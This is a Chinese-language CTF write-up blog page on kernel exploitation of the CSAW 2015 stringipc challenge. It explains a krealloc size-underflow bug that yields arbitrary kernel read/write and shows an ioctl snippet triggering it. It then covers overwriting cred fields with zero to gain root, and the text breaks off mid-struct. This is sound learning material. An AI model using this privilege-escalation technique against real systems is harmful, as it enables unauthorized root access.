<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Linux kernel pwn,CTF," />










<meta name="description" content="调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。不，又来更了，应该有两周了，踩了很多坑，记录一下。">
<meta name="keywords" content="Linux kernel pwn,CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dir利用学习">
<meta property="og:url" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/index.html">
<meta property="og:site_name" content="X3h1n">
<meta property="og:description" content="调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。不，又来更了，应该有两周了，踩了很多坑，记录一下。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/3.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/4.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/1.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/2.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/7.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/8.png">
<meta property="og:updated_time" content="2019-10-25T02:29:46.346Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ret2dir利用学习">
<meta name="twitter:description" content="调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。不，又来更了，应该有两周了，踩了很多坑，记录一下。">
<meta name="twitter:image" content="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/3.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/"/>





  <title>ret2dir利用学习 | X3h1n</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">X3h1n</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/10/10/ret2dir利用学习/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="X3h1n">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">ret2dir利用学习</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-10T11:16:12+08:00">
                2019-10-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>调了好几天的题目，断断续续快一周了，整理一下与ret2dir相关的题目。不，又来更了，应该有两周了，踩了很多坑，记录一下。<br><a id="more"></a></p>
<h1 id="CSAW-2015-stringipc"><a href="#CSAW-2015-stringipc" class="headerlink" title="CSAW 2015 stringipc"></a>CSAW 2015 stringipc</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>直接使用了p4nda大佬编译的<a href="https://github.com/ret2p4nda/kernel-pwn/tree/master/stringipc" target="_blank" rel="noopener">题目</a>，配合着<a href="https://github.com/mncoppola/StringIPC/blob/master/main.c" target="_blank" rel="noopener">题目源码</a>来看的，在IDA里看实在是太难受了。<br>题目开始定义了一个结构体ipc_channel，有五个成员，提供了channel的alloc、read、write、grow、shrink和seek六个功能。成员变量id用来标识每一个channel，相当于索引。index用来标识所申请的buf的位置指针。因为seek提供了对该指针的重置SEEK_SET和定位SEEK_CUR的功能。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">ref</span>;</span> <span class="comment">//计数值</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>关于第一个成员变量，其实是用来计数的，关于结构体kref，具体定义及涉及到的函数如下，具体可以看<a href="https://blog.csdn.net/wince_lover/article/details/70821020" target="_blank" rel="noopener">这篇博客</a>。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> refcount; <span class="comment">//原子引用计数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">kref_init</span><span class="params">(struct kref *kref)</span></span>; <span class="comment">//初始化引用计数，初始为1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kref_get</span><span class="params">(struct kref *kref)</span> <span class="comment">//y引用计数值加1</span></span></span><br><span class="line">int kref_put(struct kref *kref, void (*release)(struct kref *kref)) //引用计数值减1，计数值为0时调用回调函数release</span><br></pre></td></tr></table></figure></p>
<p>题目中还涉及到一个结构体struct idr，Linux的IDR机制实现了id与数据结构地址的绑定，一般是结构体的地址，一般当地址数量较少时，可以通过一个全局的数组来存储这些地址，然后使用数组下标来访问，当地址数量很大时，固定长度的数组无法存储，IDR将数组和链表相结合，内部采用红黑树实现，且具有很高的搜索效率，更多的关于IDR机制的可以看<a href="https://www.cnblogs.com/zero-jh/p/5184836.html" target="_blank" rel="noopener">这篇博客</a>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> *<span class="title">top</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> *<span class="title">id_free</span>;</span></span><br><span class="line">    <span class="keyword">int</span>          layers; <span class="comment">/* only valid without concurrent changes */</span></span><br><span class="line">    <span class="keyword">int</span>          id_free_cnt;</span><br><span class="line">    <span class="keyword">spinlock_t</span>      lock;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="题目漏洞"><a href="#题目漏洞" class="headerlink" title="题目漏洞"></a>题目漏洞</h2><p>题目漏洞在于在进行grow和shrink时会调用realloc_ipc_channel对buf的size进行增大或减小，realloc_ipc_channel调用了krealloc完成此功能。函数根据krealloc的返回值是否为空来判断是否执行成功。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">realloc_ipc_channel</span> <span class="params">( struct ipc_state *state, <span class="keyword">int</span> id, <span class="keyword">size_t</span> size, <span class="keyword">int</span> grow )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> new_size;</span><br><span class="line">    <span class="keyword">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL); <span class="comment">//here</span></span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是当krealloc的第二个参数为0时，也就是size为0，会返回ZERO_SIZE_PTR，但这个变量是不为0的，可以执行成功。但此时new_size+1 = 0,new_size=0xffffffffffffffff，因为new_size的类型是size_t，是无符号类型。这样其实就拥有了任意读写的权限。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/mm/slab_common.c#L1236</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> new_size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">		kfree(p);</span><br><span class="line">		<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_krealloc(p, new_size, flags);</span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">		kfree(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/include/linux/slab.h#L101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZERO_SIZE_PTR ((void *)16)</span></span><br></pre></td></tr></table></figure></p>
<p>这个过程先是申请一个channel，再shrink size为old_size+1，从而使得new_size = -1：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">alloc_channel.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_channel.id = <span class="number">-1</span>;</span><br><span class="line"> ioctl(fd,CSAW_ALLOC_CHANNEL, &amp;alloc_channel);</span><br><span class="line"><span class="keyword">if</span>(alloc_channel.id == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-]alloc failed\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]ALloc channel id: %d\n"</span>, alloc_channel.id);</span><br><span class="line">    </span><br><span class="line">id = alloc_channel.id;</span><br><span class="line">shrink_channel.id = id;</span><br><span class="line">shrink_channel.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL, &amp;shrink_channel);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]shrink channel buf_size to -1\n"</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="利用方法一-覆写cred结构体"><a href="#利用方法一-覆写cred结构体" class="headerlink" title="利用方法一 覆写cred结构体"></a>利用方法一 覆写cred结构体</h2><h3 id="进程描述符、线程描述符和cred"><a href="#进程描述符、线程描述符和cred" class="headerlink" title="进程描述符、线程描述符和cred"></a>进程描述符、线程描述符和cred</h3><p>内核使用进程描述符来管理进程，进程描述符对应的数据结构是task struct，这个数据结构太大了，这里只列出了部分成员，其中我们看到有cred结构体和real_cred结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">//https://elixir.bootlin.com/linux/v4.4.110/source/include/linux/sched.h#L1390</span><br><span class="line">struct task_struct &#123;</span><br><span class="line">	volatile long state;	/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span><br><span class="line">	void *stack;</span><br><span class="line">	atomic_t usage;</span><br><span class="line">	unsigned int flags;	/* per process flags, defined below */</span><br><span class="line">	unsigned int ptrace;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">/* process credentials */</span><br><span class="line">	const struct cred __rcu *ptracer_cred; /* Tracer&apos;s credentials at attach */</span><br><span class="line">	const struct cred __rcu *real_cred; /* objective and real subjective task</span><br><span class="line">					 * credentials (COW) */</span><br><span class="line">	const struct cred __rcu *cred;	/* effective (overridable) subjective task</span><br><span class="line">					 * credentials (COW) */</span><br><span class="line">	char comm[TASK_COMM_LEN]; /* executable name excluding path</span><br><span class="line">				     - access with [gs]et_task_comm (which lock</span><br><span class="line">				       it with task_lock())</span><br><span class="line">				     - initialized normally by setup_new_exec */</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">/* ipc stuff */</span><br><span class="line">	struct sysv_sem sysvsem;</span><br><span class="line">	struct sysv_shm sysvshm;</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_DETECT_HUNG_TASK</span><br><span class="line">/* hung task detection */</span><br><span class="line">	unsigned long last_switch_count;</span><br><span class="line">#endif</span><br><span class="line">/* filesystem information */</span><br><span class="line">	struct fs_struct *fs;</span><br><span class="line">/* open file information */</span><br><span class="line">	struct files_struct *files;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">/* journalling filesystem info */</span><br><span class="line">	void *journal_info;</span><br><span class="line"></span><br><span class="line">/* stacked block device info */</span><br><span class="line">	struct bio_list *bio_list;</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_BLOCK</span><br><span class="line">/* stack plugging */</span><br><span class="line">	struct blk_plug *plug;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">/*</span><br><span class="line"> * WARNING: on x86, &apos;thread_struct&apos; contains a variable-sized</span><br><span class="line"> * structure.  It *MUST* be at the end of &apos;task_struct&apos;.</span><br><span class="line"> *</span><br><span class="line"> * Do not put anything below here!</span><br><span class="line"> */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>cred这个数据结构用来标识进程的权限，cred结构体具体定义如下，这里涉及到一个cred和real_cred的区别，按照源码中的注释，我的理解是real_cred是自己进程本身的权限，cred是作用于其他task的权限，通常情况下它们都是一样的。在拥有了内存任意读写权限后，将cred结构体中的uid~fsgid全部覆写为0，这样进程就有了root权限。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/include/linux/cred.h#L118</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>对于进程来说，Linux将两个不同的数据结构紧凑的存放在一个单独为进程分配的存储空间中，一个是与进程描述符task_struct相关的小的数据结构thread_info，叫做线程描述符，一个是内核态的进程堆栈，这块存储区域通常为8kb的大小，也就是两个页框，内核让这占据8kb的数据结构存储在两个连续的页框中，并且起始地址是是2^13的倍数。下图表示了8kb的内存区存储这两个数据结构的方式，图来源于《深入理解Linux内核》。<br><img src="/2019/10/10/ret2dir利用学习/3.png" alt="3"><br>从图中也可以看出thread_info与task_struct的联系，task_struct作为thread_info的成员，具体数据结构定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/arch/ia64/include/asm/thread_info.h#L21</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span>	<span class="comment">/* XXX not really needed, except for dup_task_struct() */</span></span><br><span class="line">	__u32 flags;			<span class="comment">/* thread_info flags (see TIF_*) */</span></span><br><span class="line">	__u32 cpu;			<span class="comment">/* current CPU */</span></span><br><span class="line">	__u32 last_cpu;			<span class="comment">/* Last CPU thread ran on */</span></span><br><span class="line">	__u32 status;			<span class="comment">/* Thread synchronous flags */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span> addr_limit;	<span class="comment">/* user-level address space limit */</span></span><br><span class="line">	<span 